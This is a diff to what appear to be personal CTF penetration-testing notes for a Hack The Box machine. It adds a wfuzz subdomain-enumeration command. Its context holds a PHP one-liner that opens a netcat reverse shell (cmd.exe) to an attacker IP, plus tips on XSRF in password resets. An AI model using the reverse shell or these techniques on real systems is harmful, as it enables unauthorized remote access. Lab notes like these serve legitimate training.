@@ -5,6 +5,7 @@
 | Curl vs Refreshing the page | Curl the page, you may see different users invoking the service (secnotes.htb) |
 | Simple PHP to run nc.exe | ```<?php system('nc.exe -e cmd.exe 10.10.16.19 12345' ?> >> nc.php``` |
 | Check for XSRF in password reset functions | If the application allows a password reset without validating the user, you maybe able to trick the user into resetting their password |
+| Subdomain enumeration with wfuzz | ```sudo wfuzz -c -f sub-fighter.txt -w subdomains-top1million-5000.txt -u 'http://domain.xyz' -H "Host:FUZZ.domain.xyz" --hw 290``` |
 
 ## 2nd Order SQLi
 ```
